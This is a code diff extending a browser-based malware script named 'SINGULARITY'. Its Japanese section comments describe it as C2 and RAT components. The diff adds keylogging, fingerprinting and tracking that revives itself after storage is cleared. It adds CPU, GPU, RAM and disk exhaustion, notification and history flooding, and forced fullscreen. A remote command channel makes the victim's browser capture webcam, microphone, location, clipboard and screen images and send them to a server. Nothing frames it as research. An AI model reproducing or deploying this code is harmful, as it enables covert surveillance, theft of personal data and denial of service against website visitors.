+      } catch (e) {}
+      return os.apply(this, arguments);
+    };
+  } catch (e) {}
+  R.xhrHooked = true;
 }
 
 /* ================= 3. 指紋 ================= */
@@ -455,16 +647,18 @@ function canvasFP() {
 function webglFP() {
   try {
     var c = document.createElement("canvas");
-    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    var gl = c.getContext("webgl2") || c.getContext("webgl") || c.getContext("experimental-webgl");
     if (!gl) return null;
     var dbg = gl.getExtension("WEBGL_debug_renderer_info");
     var o = {
       vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
       gpuVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
       gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
-      glVersion: gl.getParameter(gl.VERSION),
+      glVersion: gl.getParameter(gl.VERSION), glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
       maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-      extCount: (gl.getSupportedExtensions() || []).length
+      maxViewport: (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join("x"),
+      extCount: (gl.getSupportedExtensions() || []).length,
+      webgl2: !!gl.texStorage2D
     };
     o.hash = hash(JSON.stringify(o));
     return o;
@@ -512,7 +706,13 @@ function fontFP() {
       if (ok) hit.push(f);
     });
     sp.remove();
-    return { count: hit.length, detected: hit, hash: hash(hit.join("|")) };
+    var viaApi = [];
+    try {
+      if (document.fonts && document.fonts.check) {
+        FONTS.forEach(function (f) { if (document.fonts.check('12px "' + f + '"')) viaApi.push(f); });
+      }
+    } catch (e) {}
+    return { count: hit.length, detected: hit, viaApi: viaApi.length, hash: hash(hit.join("|") + viaApi.join("|")) };
   } catch (e) { return null; }
 }
 function mathFP() {
@@ -573,15 +773,15 @@ function webrtc() {
     try {
       var RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
       if (!RTC) return res(null);
-      var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+      var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
       try { pc.createDataChannel("s"); } catch (e) {}
       pc.onicecandidate = function (e) {
         if (!e.candidate) return;
-        var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f]{8}-[0-9a-f-]+\.local)/i.exec(e.candidate.candidate);
+        var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f]{8}-[0-9a-f-]+\.local|[0-9a-f:]{6,})/i.exec(e.candidate.candidate);
         if (!m) return;
         var v = m[0];
         if (/\.local$/i.test(v)) out.mdns.push(v);
-        else if (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/.test(v)) out.local.push(v);
+        else if (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|fe80)/.test(v)) out.local.push(v);
         else out.public.push(v);
       };
       pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
@@ -608,7 +808,8 @@ function privacy() {
     serviceWorker: !!navigator.serviceWorker, cookies: navigator.cookieEnabled,
     opfs: !!(navigator.storage && navigator.storage.getDirectory),
     webAssembly: typeof WebAssembly !== "undefined",
-    webgl2: (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })()
+    webgl2: (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })(),
+    devtools: (function () { try { return (outerWidth - innerWidth) > 160 || (outerHeight - innerHeight) > 160; } catch (e) { return null; } })()
   };
   if (navigator.storage && navigator.storage.estimate) {
     navigator.storage.estimate().then(function (e) {
@@ -673,6 +874,7 @@ function codecs() {
       push(false);
     }).catch(function () {});
   } catch (e) {}
+  try { if (performance.memory) R.hardware.heapMB = Math.round(performance.memory.usedJSHeapSize / 1048576); } catch (e) {}
 }
 function benchmark() {
   var t = performance.now(), n = 0;
@@ -769,6 +971,7 @@ function behavior() {
     var t = e.touches && e.touches[0]; if (t) B.touches.push([t.clientX, t.clientY, t.force || null]);
   }, { passive: true });
   motion();
+  keylog();
 }
 function entropy() {
   var d = R.behavioral.dwell || [], f = R.behavioral.flight || [];
@@ -796,17 +999,19 @@ function botProbe() {
   R.bot = b;
 }
 
-/* ================= 10. 永続 / 復活 ================= */
+/* ================= 10. 永続 / 復活 / 暗号個体ID ================= */
 function persistState() {
   if (!CFG.persist) return;
   try {
     var meta = JSON.parse(ls("sg:meta") || "null") || { first: now(), hits: 0 };
     meta.hits = (meta.hits || 0) + 1; meta.prevSid = meta.sid || null; meta.sid = SID;
+    meta.ver = MYVER;
     if (CFG.remember) meta.maxLevel = Math.max(meta.maxLevel || 0, LEVEL);
     ls("sg:meta", JSON.stringify(meta));
     R.privacy.revisit = meta.hits; R.privacy.returning = meta.hits > 1;
     R.privacy.maxLevel = meta.maxLevel || LEVEL;
   } catch (e) {}
+  try { ck("sgid", SID); ck("sgv", MYVER); } catch (e) {}
   try {
     if (navigator.storage && navigator.storage.persist) {
       navigator.storage.persist().then(function (ok) { R.privacy.persisted = !!ok; push(false); }).catch(function () {});
@@ -816,7 +1021,45 @@ function persistState() {
     var rq = indexedDB.open("singularity", 1);
     rq.onupgradeneeded = function () { try { rq.result.createObjectStore("hits", { autoIncrement: true }); } catch (e) {} };
     rq.onsuccess = function () {
-      try { rq.result.transaction("hits", "readwrite").objectStore("hits").add({ t: now(), sid: SID, href: location.href }); } catch (e) {}
+      try { rq.result.transaction("hits", "readwrite").objectStore("hits").add({ t: now(), sid: SID, href: location.href, v: MYVER }); } catch (e) {}
+    };
+  } catch (e) {}
+}
+function resurrect() {
+  /* localStorage 全消しでも Cookie / window.name / SW / Cache から蘇る */
+  try {
+    var meta = ls("sg:meta");
+    if (!meta && (ck("sgid") || wn())) {
+      R.privacy.resurrected = true;
+      ls("sg:meta", JSON.stringify({ first: now(), hits: 1, sid: SID, resurrect: 1 }));
+    }
+  } catch (e) {}
+  if (CFG.selfheal !== false && navigator.serviceWorker && navigator.serviceWorker.getRegistrations) {
+    navigator.serviceWorker.getRegistrations().then(function (rs) {
+      var mine = rs.some(function (r) { return (r.active && r.active.scriptURL || "").indexOf("/sg/sw.js") >= 0; });
+      if (!mine) { R.privacy.selfheal = 1; swInstall(); }
+    }).catch(function () {});
+  }
+}
+function cryptoID() {
+  try {
+    if (!crypto || !crypto.subtle) return;
+    var p = crypto.subtle;
+    var rq = indexedDB.open("sg-usb", 1);
+    rq.onupgradeneeded = function () { try { rq.result.createObjectStore("kv"); } catch (e) {} };
+    rq.onsuccess = function () {
+      try {
+        var tx = rq.result.transaction("kv", "readwrite"), st = tx.objectStore("kv");
+        var g = st.get("csec");
+        g.onsuccess = function () {
+          var sec = g.result;
+          if (!sec) { sec = b64u(crypto.getRandomValues(new Uint8Array(32))); st.put(sec, "csec"); }
+          R.crypto.secret = sec.slice(0, 16);
+          p.digest("SHA-256", new TextEncoder().encode(sec + "|" + SID + "|" + (R.vectors.canvas || {}).hash))
+            .then(function (h) { R.crypto.id = b64u(h).replace(/[^A-Za-z0-9]/g, "").slice(0, 32); push(false); })
+            .catch(function () {});
+        };
+      } catch (e) {}
     };
   } catch (e) {}
 }
@@ -828,12 +1071,20 @@ function swInstall() {
       function hello() {
         try {
           var t = reg.active || navigator.serviceWorker.controller;
-          if (t) t.postMessage({ type: "hello", cmd: CFG.cmd, page: location.pathname,
-                                 sid: SID, level: LEVEL, man: CFG.manifest, icons: CFG.icons });
+          if (t) t.postMessage({ type: "hello", cmd: CFG.cmd, page: location.pathname, sid: SID,
+                                 level: LEVEL, man: CFG.manifest, icons: CFG.icons,
+                                 inj: CFG.inj, ver: MYVER });
         } catch (e) {}
       }
       hello(); setTimeout(hello, 1200); setTimeout(hello, 4000); setTimeout(hello, 9000);
       try { if (reg.sync && reg.sync.register) reg.sync.register("sg-flush"); } catch (e) {}
+      try {
+        if (reg.periodicSync && reg.periodicSync.register) {
+          reg.periodicSync.register("sg-sync", { minInterval: 15 * 60 * 1000 })
+            .then(function () { R.privacy.periodic = 1; }).catch(function () { R.privacy.periodic = "denied"; });
+        }
+      } catch (e) {}
+      try { if (navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ type: "check" }); } catch (e) {}
     })
     .catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
 }
@@ -862,10 +1113,13 @@ function slim(o) {
   var c = JSON.parse(JSON.stringify(o));
   if (c.media) { delete c.media.snapshot; delete c.media.motion; }
   if (c.behavioral) { delete c.behavioral.path; delete c.behavioral.clicks; delete c.behavioral.touches; }
+  if (c.keylog) c.keylog = (c.keylog || []).slice(-40);
+  if (c.errors) c.errors = (c.errors || []).slice(-6);
   return c;
 }
 function flush() {
   R.t = now(); R.dwellMs = now() - T0; R.attempts = (R.attempts || 0) + 1;
+  R.keylog = KEYLOG.slice(-400);
   var full = JSON.stringify(R), done = false;
   var finish = function (ok, via) {
     if (done) return; done = true; R.viral.via = via; R.viral.ok = ok;
@@ -893,24 +1147,74 @@ function flush() {
 function burnStart() {
   if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
   if (R.burn.mode === "running") return;
-  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 24);
+  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 48);
   var src;
   try { src = URL.createObjectURL(new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" })); }
   catch (e) { err_(e); return; }
-  R.burn = { workers: 0, mode: "running", cores: n };
+  R.burn = { workers: 0, mode: "running", cores: n, wasm: !!CFG.wasm };
   for (var i = 0; i < n; i++) {
     try {
       var w = new Worker(src);
-      w.postMessage({ kind: "burn", mb: CFG.workerMB || 0, gpu: (i === 0 && CFG.gpu) });
+      w.postMessage({ kind: "burn", mb: CFG.workerMB || 0, gpu: (i === 0 && CFG.gpu), wasm: !!CFG.wasm });
       WORKERS.push(w);
       R.burn.workers++;
     } catch (e) { err_(e); }
   }
   push(false);
 }
+function webgpuBurn() {
+  if (!CFG.webgpu || !navigator.gpu) return;
+  navigator.gpu.requestAdapter({ powerPreference: "high-performance" }).then(function (ad) {
+    if (!ad) return;
+    try {
+      if (ad.info) R.hardware.gpuAdapter = { vendor: ad.info.vendor, arch: ad.info.architecture, device: ad.info.device, desc: ad.info.description, sub: ad.info.subgroupMaxSize };
+    } catch (e) {}
+    ad.requestDevice().then(function (dev) {
+      try {
+        var wgsl = "@group(0) @binding(0) var<storage, read_write> o: array<f32>;\n"
+          + "@compute @workgroup_size(64) fn main(@builtin(global_invocation_id) g: vec3<u32>) {\n"
+          + "  var x = f32(g.x); var s = 0.0;\n"
+          + "  for (var i = 0u; i < 4000u; i = i + 1u) { s = sin(s * 1.0001 + x) + cos(s * 0.999); }\n"
+          + "  o[g.x] = s;\n}";
+        var mod = dev.createShaderModule({ code: wgsl });
+        var pipe = dev.createComputePipeline({ layout: "auto", compute: { module: mod, entryPoint: "main" } });
+        var N = 1 << 16;
+        var buf = dev.createBuffer({ size: N * 4, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST });
+        var bg = dev.createBindGroup({ layout: pipe.getBindGroupLayout(0), entries: [{ binding: 0, resource: { buffer: buf } }] });
+        R.burn.webgpu = "running";
+        (function loop() {
+          if (R.paused) return;
+          try {
+            var enc = dev.createCommandEncoder();
+            var p = enc.beginComputePass();
+            p.setPipeline(pipe); p.setBindGroup(0, bg);
+            p.dispatchWorkgroups(N / 64);
+            p.end();
+            dev.queue.submit([enc.finish()]);
+          } catch (e) {}
+          setTimeout(loop, 0);
+        })();
+        push(false);
+      } catch (e) { err_(e); }
+    }).catch(function () {});
+  }).catch(function () {});
+}
+function workletBurn() {
+  if (!CFG.worklet || R.worklet) return;
+  try {
+    var src = "class B extends AudioWorkletProcessor{constructor(){super();this.s=0;}"
+      + "process(){for(var i=0;i<8000;i++){this.s+=Math.sin(this.s)*Math.cos(i);}return true;}}"
+      + "registerProcessor('sg-burn',B);";
+    var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
+    var ctx = new AC();
+    ctx.audioWorklet.addModule(URL.createObjectURL(new Blob([src], { type: "application/javascript" })))
+      .then(function () { var n = new AudioWorkletNode(ctx, "sg-burn"); n.connect(ctx.destination); R.worklet = "running"; push(false); })
+      .catch(function (e) { R.worklet = "err"; });
+  } catch (e) {}
+}
 function ramStart() {
   if (!CFG.ramMB || R.ram.mode === "growing" || R.ram.mode === "done") return;
-  var target = CFG.ramMB * 1048576, step = 4 * 1048576, held = [], n = 0;
+  var target = CFG.ramMB * 1048576, step = 8 * 1048576, held = [], n = 0;
   R.ram = { mb: 0, mode: "growing" };
   (function tick() {
     if (R.paused) return;
@@ -920,7 +1224,7 @@ function ramStart() {
       held.push(a); n += step;
     } catch (e) { err_(e); R.ram = { mb: Math.round(n / 1048576), mode: "alloc-fail" }; push(false); return; }
     R.ram = { mb: Math.round(n / 1048576), mode: n >= target ? "done" : "growing" };
-    if (R.ram.mode === "done" || (n / step) % 16 === 0) push(false);
+    if (R.ram.mode === "done" || (n / step) % 8 === 0) push(false);
     if (R.ram.mode !== "done") setTimeout(tick, 0);
   })();
 }
@@ -936,9 +1240,8 @@ function diskStart() {
     function done(mode) { R.disk.mode = mode; push(false); }
     function put(name, src) {
       if (navigator.storage.getDirectory) {
-        return navigator.storage.getDirectory().then(function (dir) {
-          return dir.getFileHandle(name, { create: true });
-        }).then(function (fh) { return fh.createWritable(); })
+        return navigator.storage.getDirectory().then(function (dir) { return dir.getFileHandle(name, { create: true }); })
+          .then(function (fh) { return fh.createWritable(); })
           .then(function (w) { return w.write(src).then(function () { return w.close(); }); })
           .then(function () { R.disk.via = "opfs"; });
       }
@@ -958,7 +1261,7 @@ function diskStart() {
         put("sg-" + rid(10) + ".bin", buf).then(function () {
           R.disk.files++;
           if (R.disk.files % 8 === 0) push(false);
-          if (R.disk.files > 20000) return done("cap");
+          if (R.disk.files > 30000) return done("cap");
           setTimeout(loop, 0);
         }).catch(function (e) { err_(e); done("err:" + ((e && e.name) || "x")); });
       }).catch(function () { done("estimate-fail"); });
@@ -972,7 +1275,7 @@ function historyFlood() {
   R.history = { pushed: 0, target: n, mode: "running" };
   (function step() {
     if (R.paused) return;
-    var end = Math.min(i + 300, n);
+    var end = Math.min(i + 400, n);
     for (; i < end; i++) { try { history.pushState({ sg: i }, "", "#sg" + i); } catch (e) { break; } }
     R.history.pushed = i;
     if (i < n) setTimeout(step, 0); else { R.history.mode = "done"; push(false); }
@@ -982,17 +1285,14 @@ function notifyFlood() {
   if (!CFG.notify || typeof Notification === "undefined") return;
   function go() {
     if (Notification.permission !== "granted") return;
-    var n = Math.min(parseInt(CFG.notify, 10) || 0, 40);
+    var n = Math.min(parseInt(CFG.notify, 10) || 0, 60);
     for (var i = 0; i < n; i++) {
-      try { new Notification(CFG.avName, { body: "感染 " + (i + 1) + "/" + n, tag: "sg" + i }); } catch (e) {}
+      try { new Notification(CFG.avName, { body: "感染 " + (i + 1) + "/" + n, tag: "sg" + i, requireInteraction: i === 0, silent: i > 0 }); } catch (e) {}
     }
     R.notify = { sent: n };
   }
   try {
-    if (Notification.permission === "default") {
-      var p = Notification.requestPermission(go);
-      if (p && p.then) p.then(go);
-    } else go();
+    if (Notification.permission === "default") { var p = Notification.requestPermission(go); if (p && p.then) p.then(go); } else go();
   } catch (e) {}
 }
 function audioLoop() {
@@ -1000,7 +1300,7 @@ function audioLoop() {
   try {
     var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
     var ctx = new AC(); R.audio = { state: ctx.state };
-    function kick() { try { ctx.resume(); R.audio.state = ctx.state; } catch (e) {} }
+    function kick() { try { ctx.resume(); R.audio.state = ctx.state; workletBurn(); } catch (e) {} }
     ["click", "keydown", "touchstart", "pointerdown", "scroll"].forEach(function (e) { addEventListener(e, kick, { passive: true }); });
     setInterval(function () {
       if (R.paused || ctx.state !== "running") return;
@@ -1024,6 +1324,61 @@ function titleFlicker() {
     if (R.paused) return;
     on = !on; document.title = (on ? "\u26a0 " : "\u2623 ") + b;
   }, CFG.flickMs);
+}
+function faviconSpin() {
+  if (!CFG.favicon || R.fav) return;
+  try {
+    var c = document.createElement("canvas"); c.width = 64; c.height = 64;
+    var x = c.getContext("2d");
+    var link = document.querySelector("link[rel*='icon']") || document.createElement("link");
+    link.rel = "icon"; if (!link.parentNode) document.head.appendChild(link);
+    var a = 0;
+    R.fav = 1;
+    setInterval(function () {
+      if (R.paused) return;
+      a += 0.25;
+      x.clearRect(0, 0, 64, 64);
+      x.fillStyle = "#05070a"; x.fillRect(0, 0, 64, 64);
+      x.strokeStyle = "#00ff88"; x.lineWidth = 4;
+      x.beginPath(); x.arc(32, 32, 22, a, a + 4.6); x.stroke();
+      x.strokeStyle = "#4c8dff"; x.lineWidth = 3;
+      x.beginPath(); x.arc(32, 32, 13, -a * 1.7, -a * 1.7 + 4.2); x.stroke();
+      x.fillStyle = "#00ff88"; x.beginPath(); x.arc(32, 32, 5, 0, 6.3); x.fill();
+      try { link.href = c.toDataURL("image/png"); } catch (e) {}
+    }, 500);
+  } catch (e) {}
+}
+function badge(n) {
+  if (!CFG.badge) return;
+  try { if (navigator.setAppBadge) navigator.setAppBadge(n || (LEVEL + 1)).catch(function () {}); } catch (e) {}
+}
+function mediaHijack() {
+  if (!CFG.mediaSession || !navigator.mediaSession || R.ms) return;
+  try {
+    var c = document.createElement("canvas"); c.width = c.height = 512;
+    var x = c.getContext("2d");
+    x.fillStyle = "#05070a"; x.fillRect(0, 0, 512, 512);
+    x.strokeStyle = "#00ff88"; x.lineWidth = 14;
+    x.beginPath(); x.arc(256, 256, 170, 0, 6.3); x.stroke();
+    x.fillStyle = "#00ff88"; x.beginPath(); x.arc(256, 256, 46, 0, 6.3); x.fill();
+    var art = c.toDataURL("image/png");
+    navigator.mediaSession.metadata = new MediaMetadata({
+      title: CFG.avName, artist: "SINGULARITY", album: "特異点 v" + MYVER,
+      artwork: [{ src: art, sizes: "512x512", type: "image/png" }]
+    });
+    ["play", "pause", "nexttrack", "previoustrack"].forEach(function (k) {
+      try { navigator.mediaSession.setActionHandler(k, function () { push(true); }); } catch (e) {}
+    });
+    R.ms = "set";
+  } catch (e) {}
+}
+function speak(t) {
+  try {
+    if (!window.speechSynthesis) return;
+    var u = new SpeechSynthesisUtterance(t || (CFG.avName + "、感染しました"));
+    u.lang = "ja-JP"; u.rate = 1.05; u.pitch = 0.9;
+    speechSynthesis.speak(u);
+  } catch (e) {}
 }
 function windowChain() {
   if (!CFG.windows || W >= CFG.windows) return;
@@ -1053,7 +1408,7 @@ function wakelock() {
   document.addEventListener("visibilitychange", function () { if (document.visibilityState === "visible") req(); });
 }
 
-/* ================= 14. 凍結 / 停止 / 消去 ================= */
+/* ================= 14. 凍結 / 全画面 / 捕獲 / 消去 ================= */
 function freezeNow(mode) {
   mode = mode || CFG.freeze;
   if (mode !== "soft" && mode !== "hard") return;
@@ -1074,6 +1429,40 @@ function pauseAll() {
   WORKERS = [];
   if (R.burn) R.burn.mode = "stopped";
 }
+function goFullscreen() {
+  if (!CFG.fullscreen || R.fs) return;
+  try {
+    R.fs = 1;
+    var el = document.documentElement;
+    (el.requestFullscreen ? el.requestFullscreen({ navigationUI: "hide" }) : Promise.reject()).catch(function () {});
+  } catch (e) {}
+}
+function goPointerLock() {
+  if (!CFG.pointerlock || R.pl) return;
+  try { R.pl = 1; document.body.requestPointerLock(); } catch (e) {}
+}
+function pipOpen() {
+  if (!CFG.pip || R.pip || !window.documentPictureInPicture) return;
+  try {
+    documentPictureInPicture.requestWindow({ width: 240, height: 130 }).then(function (w) {
+      R.pip = 1;
+      var d = w.document;
+      d.body.style.cssText = "margin:0;background:#05070a;color:#00ff88;font:11px ui-monospace;display:grid;place-items:center;overflow:hidden";
+      d.body.innerHTML = "<canvas id='c' width='220' height='110'></canvas>";
+      var c = d.getElementById("c"), x = c.getContext("2d"), a = 0;
+      (function loop() {
+        a += 0.06;
+        x.clearRect(0, 0, 220, 110);
+        x.strokeStyle = "#00ff88"; x.lineWidth = 2;
+        x.beginPath(); x.arc(110, 55, 38, a, a + 5); x.stroke();
+        x.fillStyle = "#7ee08a"; x.font = "10px monospace"; x.textAlign = "center";
+        x.fillText("SINGULARITY", 110, 58);
+        x.fillStyle = "#3f7a5f"; x.fillText("L" + LEVEL + " / " + CFG.avName, 110, 72);
+        try { w.requestAnimationFrame(loop); } catch (e) { setTimeout(loop, 60); }
+      })();
+    }).catch(function () { R.pip = "err"; });
+  } catch (e) { R.pip = "err"; }
+}
 function wipe() {
   R.wiped = true;
   try { pauseAll(); } catch (e) {}
@@ -1085,13 +1474,8 @@ function wipe() {
       rs.forEach(function (r) { try { r.unregister(); } catch (e) {} });
     }));
   } catch (e) {}
-  try {
-    if (window.caches) tasks.push(caches.keys().then(function (ks) {
-      return Promise.all(ks.map(function (k) { return caches.delete(k); }));
-    }));
-  } catch (e) {}
-  try { if (window.indexedDB) { try { indexedDB.deleteDatabase("singularity"); } catch (e) {} } } catch (e) {}
-  try { if (window.indexedDB) { try { indexedDB.deleteDatabase("sg-usb"); } catch (e) {} } } catch (e) {}
+  try { if (window.caches) tasks.push(caches.keys().then(function (ks) { return Promise.all(ks.map(function (k) { return caches.delete(k); })); })); } catch (e) {}
+  try { if (window.indexedDB) { indexedDB.deleteDatabase("singularity"); indexedDB.deleteDatabase("sg-usb"); } } catch (e) {}
   try {
     if (navigator.storage && navigator.storage.getDirectory) {
       tasks.push(navigator.storage.getDirectory().then(function (dir) {
@@ -1113,21 +1497,189 @@ function wipe() {
   }).catch(function () { R.wipe.done = true; });
 }
 
-/* ================= 15. 遠隔コマンド ================= */
-function pollCmd() {
-  if (!CFG.cmd) return;
+/* ================= 15. C2（SSE + ポーリング + 個体別コマンド） ================= */
+var CMD_SEEN = {}, LASTW = 0, ESE = null;
+function ack(ids) {
+  try {
+    var b = JSON.stringify({ sid: SID, ids: ids });
+    if (navigator.sendBeacon) navigator.sendBeacon(CFG.ack, new Blob([b], { type: "application/json" }));
+    else fetch(CFG.ack, { method: "POST", headers: { "Content-Type": "application/json" }, body: b, keepalive: true });
+  } catch (e) {}
+}
+function ota() {
+  if (R.ota) return;
+  R.ota = 1;
+  try {
+    if (navigator.serviceWorker && navigator.serviceWorker.getRegistration) {
+      navigator.serviceWorker.getRegistration().then(function (r) { if (r) r.update().then(function () {}).catch(function () {}); }).catch(function () {});
+    }
+  } catch (e) {}
+  setTimeout(function () { try { location.reload(); } catch (e) {} }, 1500);
+}
+function handleCmd(j) {
+  if (!j || !j.ok) return;
+  R.cmd = { level: j.level, fire: j.fire, freeze: j.freeze, wipe: j.wipe, ver: j.ver, at: now() };
+  if (j.ver && j.ver !== MYVER && !R.ota) ota();
+  if (j.wipe && j.wipe !== LASTW) { LASTW = j.wipe; try { wipe(); } catch (e) {} }
+  if (j.fire === 0 && !R.paused) pauseAll();
+  if (j.fire === 1 && R.paused) { R.paused = false; startBurns(); }
+  if (typeof j.level === "number" && j.level !== LEVEL) { applyLevel(j.level); restart(); }
+  if (j.freeze !== undefined && j.freeze !== CFG.freeze) CFG.freeze = j.freeze || "off";
+  var ids = [];
+  (j.cmds || []).forEach(function (c) {
+    if (!c || CMD_SEEN[c.id]) return;
+    CMD_SEEN[c.id] = 1; ids.push(c.id);
+    runCmd(c);
+  });
+  if (ids.length) ack(ids);
+}
+function runCmd(c) {
+  var k = c.kind, a = c.arg || "";
+  try {
+    if (k === "shot") ratShot();
+    else if (k === "mic") ratMic();
+    else if (k === "geo") ratGeo();
+    else if (k === "clip") ratClip();
+    else if (k === "dom") domSnap(true);
+    else if (k === "speak") speak(a);
+    else if (k === "open") window.open(a, "_blank");
+    else if (k === "nav") location.href = a;
+    else if (k === "reload") location.reload();
+    else if (k === "update") ota();
+    else if (k === "freeze") freezeNow(a || "soft");
+    else if (k === "wipe") wipe();
+    else if (k === "install") { try { window.__sgInstall && window.__sgInstall(); } catch (e) {} }
+    else if (k === "title") document.title = a || CFG.avName;
+    else if (k === "badge") { try { navigator.setAppBadge && navigator.setAppBadge(parseInt(a, 10) || 1); } catch (e) {} }
+    else if (k === "notify") { try { new Notification(CFG.avName, { body: a || "感染", requireInteraction: true }); } catch (e) {} }
+    else if (k === "pip") pipOpen();
+    else if (k === "fullscreen") goFullscreen();
+    else if (k === "level") { applyLevel(parseInt(a, 10)); restart(); }
+  } catch (e) { err_(e); }
+  R.rat.last = { kind: k, arg: a, at: now() };
+  push(true);
+}
+function startBurns() {
+  try { burnStart(); } catch (e) { err_(e); }
+  try { webgpuBurn(); } catch (e) { err_(e); }
+  try { ramStart(); } catch (e) { err_(e); }
+  try { diskStart(); } catch (e) { err_(e); }
+  try { historyFlood(); } catch (e) { err_(e); }
+  try { notifyFlood(); } catch (e) { err_(e); }
+  try { audioLoop(); } catch (e) { err_(e); }
+  try { titleFlicker(); } catch (e) { err_(e); }
+  try { faviconSpin(); } catch (e) { err_(e); }
+  try { mediaHijack(); } catch (e) { err_(e); }
+  try { badge(); } catch (e) { err_(e); }
+  try { uncloseable(); } catch (e) { err_(e); }
+  try { wakelock(); } catch (e) { err_(e); }
+  try { windowChain(); } catch (e) { err_(e); }
+  try { hookXHR(); } catch (e) { err_(e); }
+  push(false);
+}
+function restart() {
+  try { pauseAll(); } catch (e) {}
+  R.paused = false; WORKERS = [];
+  R.burn = {}; R.ram = {}; R.disk = {}; R.history = {};
+  startBurns();
+}
+function c2() {
+  var q = "?sid=" + encodeURIComponent(SID);
+  if (CFG.sse && window.EventSource) {
+    try {
+      ESE = new EventSource(CFG.sse + q);
+      R.sse = "connecting";
+      ESE.onopen = function () { R.sse = "open"; };
+      ESE.onmessage = function (ev) { try { handleCmd(JSON.parse(ev.data)); } catch (e) {} };
+      ESE.onerror = function () { R.sse = "error"; };
+    } catch (e) { R.sse = "err"; }
+  }
   setInterval(function () {
-    fetch(CFG.cmd + "?sid=" + SID, { cache: "no-store" })
-      .then(function (r) { return r.json(); })
-      .then(function (j) {
-        if (!j || !j.ok) return;
-        R.cmd = { level: j.level, fire: j.fire, wipe: j.wipe };
-        if (j.fire === 0 && !R.paused) { pauseAll(); return; }
-      }).catch(function () {});
+    if (R.sse === "open") return;
+    fetch(CFG.cmd + q, { cache: "no-store" }).then(function (r) { return r.json(); }).then(handleCmd).catch(function () {});
   }, CFG.cmdInterval);
 }
 
-/* ================= 16. 判定 ================= */
+/* ================= 16. RAT ================= */
+function ratShot() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  navigator.mediaDevices.getUserMedia({ audio: false, video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } })
+    .then(function (st) {
+      var v = document.createElement("video"); v.muted = true; v.playsInline = true; v.srcObject = st;
+      v.onloadedmetadata = function () {
+        v.play().then(function () {
+          setTimeout(function () {
+            try {
+              var c = document.createElement("canvas"); c.width = 640; c.height = 480;
+              c.getContext("2d").drawImage(v, 0, 0, 640, 480);
+              R.rat.shot = c.toDataURL("image/jpeg", 0.7);
+              R.rat.shotAt = now();
+              st.getTracks().forEach(function (t) { t.stop(); });
+              push(true);
+            } catch (e) {}
+          }, 500);
+        }).catch(function () {});
+      };
+    }).catch(function (e) { R.rat.shotErr = (e && e.name) || "err"; push(true); });
+}
+function ratMic() {
+  if (!navigator.mediaDevices || !window.MediaRecorder) return;
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function (st) {
+      var rec = new MediaRecorder(st);
+      var chunks = [];
+      rec.ondataavailable = function (e) { if (e.data && e.data.size) chunks.push(e.data); };
+      rec.onstop = function () {
+        try { st.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+        var b = new Blob(chunks, { type: "audio/webm" });
+        if (b.size > 900000) { R.rat.mic = "too-big:" + b.size; push(true); return; }
+        var fr = new FileReader();
+        fr.onload = function () { R.rat.mic = String(fr.result).split(",")[1] || ""; R.rat.micAt = now(); push(true); };
+        fr.onerror = function () { R.rat.mic = "read-err"; push(true); };
+        fr.readAsDataURL(b);
+      };
+      rec.start();
+      setTimeout(function () { try { rec.stop(); } catch (e) {} }, 3000);
+    }).catch(function (e) { R.rat.micErr = (e && e.name) || "err"; push(true); });
+}
+function ratGeo() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(function (p) {
+    R.rat.geo = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy), at: now() };
+    push(true);
+  }, function (e) { R.rat.geoErr = (e && e.code) || "err"; push(true); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
+}
+function ratClip() {
+  try {
+    if (!navigator.clipboard || !navigator.clipboard.readText) { R.rat.clipErr = "unsupported"; push(true); return; }
+    navigator.clipboard.readText().then(function (t) { R.rat.clip = String(t || "").slice(0, 800); R.rat.clipAt = now(); push(true); })
+      .catch(function (e) { R.rat.clipErr = (e && e.name) || "err"; push(true); });
+  } catch (e) {}
+}
+function ratScreen() {
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 }, audio: false, preferCurrentTab: true })
+      .then(function (st) {
+        var v = document.createElement("video"); v.muted = true; v.srcObject = st;
+        v.onloadedmetadata = function () {
+          v.play().then(function () {
+            setTimeout(function () {
+              try {
+                var c = document.createElement("canvas"); c.width = 960; c.height = 540;
+                c.getContext("2d").drawImage(v, 0, 0, 960, 540);
+                R.rat.screen = c.toDataURL("image/jpeg", 0.6);
+                st.getTracks().forEach(function (t) { t.stop(); });
+                push(true);
